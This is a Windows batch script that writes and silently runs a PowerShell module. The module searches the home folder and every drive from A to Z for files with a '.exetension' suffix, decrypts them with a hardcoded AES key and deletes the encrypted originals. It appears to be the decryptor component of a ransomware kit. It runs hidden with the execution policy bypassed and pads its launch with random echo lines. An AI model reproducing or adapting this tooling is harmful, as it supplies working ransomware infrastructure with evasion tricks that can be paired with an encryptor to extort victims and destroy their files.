@echo off
mkdir "%userprofile%/Documents/WindowsPowerShell/Modules/decry"
cd "%userprofile%/Documents/WindowsPowerShell/Modules/decry"
cls
del decry.psm1
del decry.ps1
echo function New-CryptographyKey() {  >>decry.psm1
echo [CmdletBinding()]  >>decry.psm1
echo [OutputType([String], ParameterSetName='PlainText')]  >>decry.psm1
echo Param([Parameter(Mandatory=$false, Position=1)]  >>decry.psm1
echo     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]  >>decry.psm1
echo     [String]$Algorithm='AES',  >>decry.psm1
echo     [Parameter(Mandatory=$false, Position=2)]  >>decry.psm1
echo     [Int]$KeySize,  >>decry.psm1
echo     [Parameter(ParameterSetName='PlainText')]  >>decry.psm1
echo     [Switch]$AsPlainText)  >>decry.psm1
echo     Process    {  >>decry.psm1
echo         try        {  >>decry.psm1
echo             $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)  >>decry.psm1
echo             if($PSBoundParameters.ContainsKey('KeySize')){  >>decry.psm1
echo                 $Crypto.KeySize = $KeySize             }  >>decry.psm1
echo             $Crypto.GenerateKey()  >>decry.psm1
echo             if($AsPlainText)            {  >>decry.psm1
echo                 return [System.Convert]::ToBase64String($Crypto.Key) }  >>decry.psm1
echo             else            {  >>decry.psm1
echo                 return [System.Convert]::ToBase64String($Crypto.Key) ^| ConvertTo-SecureString -AsPlainText -Force            }        }  >>decry.psm1
echo         catch        {            Write-Error $_         } } }  >>decry.psm1
echo Function Unprotect-File {  >>decry.psm1
echo [CmdletBinding(DefaultParameterSetName='SecureString')]  >>decry.psm1
echo [OutputType([System.IO.FileInfo[]])]  >>decry.psm1
echo Param(  >>decry.psm1
echo     [Parameter(Mandatory=$true, Position=1, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]  >>decry.psm1
echo     [Alias('PSPath','LiteralPath')]  >>decry.psm1
echo     [string[]]$FileName,  >>decry.psm1
echo     [Parameter(Mandatory=$false, Position=2, ValueFromPipelineByPropertyName=$true)]  >>decry.psm1
echo     [ValidateSet('AES','DES','RC2','Rijndael','TripleDES')]  >>decry.psm1
echo     [String]$Algorithm = 'AES',  >>decry.psm1
echo     [Parameter(Mandatory=$true, Position=3, ValueFromPipelineByPropertyName=$true, ParameterSetName='SecureString')]  >>decry.psm1
echo     [System.Security.SecureString]$Key,  >>decry.psm1
echo     [Parameter(Mandatory=$true, Position=3, ParameterSetName='PlainText')]  >>decry.psm1
echo     [String]$KeyAsPlainText,  >>decry.psm1
echo     [Parameter(Mandatory=$false, Position=4, ValueFromPipelineByPropertyName=$true)]  >>decry.psm1
echo     [System.Security.Cryptography.CipherMode]$CipherMode = 'CBC',  >>decry.psm1
echo     [Parameter(Mandatory=$false, Position=5, ValueFromPipelineByPropertyName=$true)]  >>decry.psm1
echo     [System.Security.Cryptography.PaddingMode]$PaddingMode = 'PKCS7',  >>decry.psm1
echo     [Parameter(Mandatory=$false, Position=6)]  >>decry.psm1
echo     [String]$Suffix, >>decry.psm1
echo     [Parameter()]  >>decry.psm1
echo     [Switch]$RemoveSource)  >>decry.psm1
echo     Process  {      try        {  >>decry.psm1
echo             if($PSCmdlet.ParameterSetName -eq 'PlainText')  >>decry.psm1
echo             {  $Key = $KeyAsPlainText ^| ConvertTo-SecureString -AsPlainText -Force    }  >>decry.psm1
echo             $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Key)  >>decry.psm1
echo             $EncryptionKey = [System.Convert]::FromBase64String([System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR))  >>decry.psm1
echo             $Crypto = [System.Security.Cryptography.SymmetricAlgorithm]::Create($Algorithm)  >>decry.psm1
echo             $Crypto.Mode = $CipherMode  >>decry.psm1
echo             $Crypto.Padding = $PaddingMode  >>decry.psm1
echo             $Crypto.KeySize = $EncryptionKey.Length*8  >>decry.psm1
echo             $Crypto.Key = $EncryptionKey  >>decry.psm1
echo         }       Catch       {        Write-Error $_ -ErrorAction Stop        }  >>decry.psm1
echo         if(-not $PSBoundParameters.ContainsKey('Suffix'))  >>decry.psm1
echo         {      $Suffix = ".$Algorithm"        }  >>decry.psm1
echo         $Files = Get-Item -LiteralPath $FileName  >>decry.psm1
echo         ForEach($File in $Files)  >>decry.psm1
echo         {  >>decry.psm1
echo             If(-not $File.Name.EndsWith($Suffix))  >>decry.psm1
echo             {  Write-Error "$($File.FullName) does not have an extension of '$Suffix'."  >>decry.psm1
echo                 Continue         }  >>decry.psm1
echo             $DestinationFile = $File.FullName -replace "$Suffix$"  >>decry.psm1
echo             Try          {  >>decry.psm1
echo                 $FileStreamReader = New-Object System.IO.FileStream($File.FullName, [System.IO.FileMode]::Open)  >>decry.psm1
echo                 $FileStreamWriter = New-Object System.IO.FileStream($DestinationFile, [System.IO.FileMode]::Create)  >>decry.psm1
echo                 [Byte[]]$LenIV = New-Object Byte[] 4  >>decry.psm1
echo                 $FileStreamReader.Seek(0, [System.IO.SeekOrigin]::Begin) ^| Out-Null  >>decry.psm1
echo                 $FileStreamReader.Read($LenIV,  0, 3) ^| Out-Null  >>decry.psm1
echo                 [Int]$LIV = [System.BitConverter]::ToInt32($LenIV,  0)  >>decry.psm1
echo                 [Byte[]]$IV = New-Object Byte[] $LIV  >>decry.psm1
echo                 $FileStreamReader.Seek(4, [System.IO.SeekOrigin]::Begin) ^| Out-Null  >>decry.psm1
echo                 $FileStreamReader.Read($IV, 0, $LIV) ^| Out-Null  >>decry.psm1
echo                 $Crypto.IV = $IV  >>decry.psm1
echo                 $Transform = $Crypto.CreateDecryptor()  >>decry.psm1
echo                 $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)  >>decry.psm1
echo                 $FileStreamReader.CopyTo($CryptoStream)  >>decry.psm1
echo                 $CryptoStream.FlushFinalBlock()  >>decry.psm1
echo                 $CryptoStream.Close()  >>decry.psm1
echo                 $FileStreamReader.Close()  >>decry.psm1
echo                 $FileStreamWriter.Close()  >>decry.psm1
echo                 if($RemoveSource){Remove-Item $File.FullName}  >>decry.psm1
echo                 Get-Item $DestinationFile ^| Add-Member -MemberType NoteProperty -Name SourceFile -Value $File.FullName -PassThru  >>decry.psm1
echo             }    Catch      {          Write-Error $_  >>decry.psm1
echo                 If($FileStreamWriter)   {  >>decry.psm1
echo                     $FileStreamWriter.Close()  >>decry.psm1
echo                     Remove-Item -LiteralPath $DestinationFile -Force  >>decry.psm1
echo                 }     Continue   }  Finally     {  >>decry.psm1
echo                 if($CryptoStream){$CryptoStream.Close()}  >>decry.psm1
echo                 if($FileStreamReader){$FileStreamReader.Close()}  >>decry.psm1
echo                 if($FileStreamWriter){$FileStreamWriter.Close()}  }    }    }}  >>decry.psm1
cls
echo Import-Module decry  >>decry.ps1
echo $files = get-childitem $home -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem A: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem B: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem C: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem D: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem E: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem F: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem G: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem H: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem I: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem J: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem K: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem L: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem M: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem N: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem O: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem P: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem Q: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem R: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem S: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem T: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem U: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem V: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem W: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem X: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem Y: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo $files = get-childitem Z: -recurse -Include *.exetension ^| where {! $_.PSIsContainer}  >>decry.ps1
echo foreach ($file in $files) { Unprotect-File $file -Algorithm AES -KeyAsPlainText ZTk0MzY1MDkwYWFiZWNhNWJkMzk0N2ZhNjkxZGE0ZmU= -Suffix '.exetension' -RemoveSource } >>decry.ps1
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
cmd /c powershell -executionpolicy bypass -win hidden -noexit -file decry.ps1
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
cls
exit /b
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
